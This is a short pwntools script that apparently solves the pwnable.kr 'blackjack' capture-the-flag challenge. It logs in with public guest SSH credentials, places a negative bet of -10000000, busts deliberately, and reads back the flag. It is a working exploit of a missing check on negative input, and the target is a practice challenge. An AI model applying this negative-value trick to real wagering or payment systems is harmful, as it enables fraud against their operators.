from pwn import *

# Connection details
user = 'blackjack'
host = 'pwnable.kr'
port = 2222
password = 'guest'

# Connect via SSH
s = ssh(user=user, host=host, port=port, password=password)

# Run the process via netcat inside SSH
p = s.process(['nc', 'localhost', '9009'])

log.info("Starting Blackjack exploit...")

# 1. Answer 'Y' to "Are You Ready?"
p.recvuntil(b'(Y/N)')
p.sendline(b'Y')

# 2. Select '1' to Begin Game
p.recvuntil(b'Choice:')
p.sendline(b'1')

# 3. Enter Bet: -10000000
p.recvuntil(b'Enter Bet: $')
p.sendline(b'-10000000')

# 4. Play to Lose (Hit until bust)
import time
# Just spam 'H' enough times to guarantee a bust (21+).
log.info("Spamming Hit to lose...")
for _ in range(15):
    p.sendline(b'H')

# Wait for server to process hits and print "Incorrect Choice" if any
time.sleep(2)
log.info("Cleaning buffer...")
try:
    p.recv(10000, timeout=1)
except:
    pass

# 5. Play Again to trigger flag
# "Would You Like To Play Again?"
# We need to answer Y
log.info("Answering Yes to play again...")
# We need to ensure we consume the "Play again" prompt first or just send it contentiously
# Receiving until the specific prompt is safer
p.sendline(b'Y')

# 6. Capture Flag
log.info("Receiving final output...")
# Allow some time for server to respond
print(p.recv(4096, timeout=5).decode(errors='ignore'))
print(p.recv(4096, timeout=5).decode(errors='ignore'))



p.close()
s.close()
